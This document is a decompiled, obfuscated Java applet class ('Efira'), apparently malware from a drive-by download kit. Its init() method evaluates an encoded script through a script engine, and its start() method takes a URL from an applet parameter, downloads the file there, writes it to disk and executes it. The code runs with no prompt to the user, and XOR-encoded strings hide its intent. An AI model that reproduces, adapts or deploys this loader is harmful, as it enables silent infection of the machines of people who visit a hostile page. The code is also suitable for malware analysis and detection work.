import java.io.InputStream;
import java.io.FileOutputStream;
import javax.script.ScriptException;
import java.awt.Component;
import javax.swing.JList;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Efira extends Applet
{
    private JList ALLATORI_DEMO;
    
    @Override
    public void init() {
        try {
            final Men men = new Men();
            men.ALLATORI_DEMO.eval(Pol.k("WyK$Op@2\u0001%SyK$OpS/\u0018*E.\u00112\u0001}\u0001.DyK$OpV`d2\u0018*E.\u00112NyK$OpSh\u0003yK$OpX`D2\u0018*E.\u00112NyK$OpSb\b{U(\u0018*E.\u0011)RnU/\u0018*E.\u0011\u0013U2\u0018*E.\u0011)OyK$OpF`\u001c`G5\u0018*E.\u0011.ByK$OpU)N.\tiZ`K!\u0018*E.\u00116@nM!\u0018*E.\u0011.Fnr9\u0018*E.\u00113U%\u0018*E.\u0011-\u000f3DyK$OpU\u0013DyK$OpB5SyK$OpH4X\r@.@yK$OpF%ShO5\u0018*E.\u0011,Mi\u001a!Q0\u0018*E.\u0011,D4\u000f3UyK$Op@2\u0018*E.\u00114\ti\u001a2DyK$OpU5\u0018*E.\u00112O`\u0003%YyK$OpQ,NyK$OpH4\u0000b\u001a=\u001a%SyK$OpSyK$OpN2\u000f-D3RyK$Op@'\u0018*E.\u0011%\u0001}\u00014I)\u0018*E.\u00113\u001a").replace(Pol.k("\u0018*E.\u0011"), ""));
            this.add(this.ALLATORI_DEMO = new JList(new Object[] { men.ALLATORI_DEMO.get(Pol.k("D2\u0018*E.\u00112NyK$OpS").replace(Pol.k("\u0018*E.\u0011"), "")) }));
        }
        catch (ScriptException ex) {}
    }
    
    @Override
    public void start() {
        try {
            String s = new Pol().ALLATORI_DEMO();
            final String s2 = new String();
            final String s3 = s;
            if (s3.charAt(s3.length() - 1) != '\\') {
                s = new StringBuilder().insert(0, s).append(Pol.k("}")).toString();
            }
            final String string = new StringBuilder().insert(0, s).append(Pol.k("I!W\"@$Es@6C!\u0013nD!W\"@8@6C!D").replace(Pol.k("!W\"@"), "")).toString();
            final String s4 = new String();
            final FileOutputStream fileOutputStream = new FileOutputStream(string);
            final String s5 = new String();
            final String s6 = new String();
            final String parameter = this.getParameter(Pol.k("$D3U"));
            final String s7 = new String();
            final InputStream iopls = Sento.Iopls(parameter);
            final String s8 = new String();
            byte[] array = new byte[153601];
            final String s9 = new String();
            final byte[] array2 = new byte[100];
            final String s10 = new String();
            InputStream inputStream = iopls;
            int read;
            while ((read = inputStream.read(array)) > 0) {
                final String s11 = new String();
                final int n = 153601;
                fileOutputStream.write(array, 0, read);
                array = new byte[n];
                inputStream = iopls;
            }
            final String s12 = new String();
            fileOutputStream.close();
            final String s13 = new String();
            iopls.close();
            try {
                final String s14 = new String();
                Sento.owms(string);
            }
            catch (Exception ex) {}
        }
        catch (Exception ex2) {}
    }
    
    private void ALLATORI_DEMO() {
    }
    
    public static String ALLATORI_DEMO(final String a) {
        final int n = 1 << 3;
        final int n2 = (0x2 ^ 0x5) << 4 ^ (0x3 ^ 0x5) << 1;
        final int length = a.length();
        final char[] array = new char[length];
        int n3;
        int i = n3 = length - 1;
        final char[] array2 = array;
        final char c = (char)n2;
        final int n4 = n;
        while (i >= 0) {
            final char[] array3 = array2;
            final int n5 = n3;
            final char char1 = a.charAt(n5);
            --n3;
            array3[n5] = (char)(char1 ^ n4);
            if (n3 < 0) {
                break;
            }
            final char[] array4 = array2;
            final int n6 = n3;
            final char c2 = (char)(a.charAt(n6) ^ c);
            --n3;
            array4[n6] = c2;
            i = n3;
        }
        return new String(array2);
    }
}
